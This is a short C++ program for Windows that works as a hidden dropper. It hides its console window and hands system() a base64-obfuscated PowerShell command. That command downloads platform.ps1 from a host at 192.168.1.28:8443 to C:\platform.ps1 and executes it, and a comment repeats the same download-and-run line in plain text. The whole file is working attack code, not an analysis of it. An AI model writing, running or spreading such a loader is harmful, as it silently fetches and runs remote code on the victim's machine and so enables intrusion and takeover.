#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <iostream>
#include <conio.h>
#include <Windows.h>
/* run this program using the console pauser or add your own getch, system("pause") or input loop */

int main(int argc, char** argv) {
	ShowWindow( GetConsoleWindow(), SW_HIDE );
        char arr[500];
        strcpy(arr," powershell.exe $value[250]; $value =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADgAOgA4ADQANAAzAC8AcABsAGEAdABmAG8AcgBtAC4AcABzADEAIAAtAG8AdQB0AEYAaQBsAGUAIABDADoAXABwAGwAYQB0AGYAbwByAG0ALgBwAHMAMQA7ACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJwBDADoAXABwAGwAYQB0AGYAbwByAG0ALgBwAHMAMQAnAA==')); powershell.exe -c $value;"); //([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADgA)))
        system(arr);
       
	//Invoke-WebRequest -uri http://192.168.1.28:8443/platform.ps1 -outFile C:\platform.ps1; powershell.exe 'C:\platform.ps1'
	return 0;
}
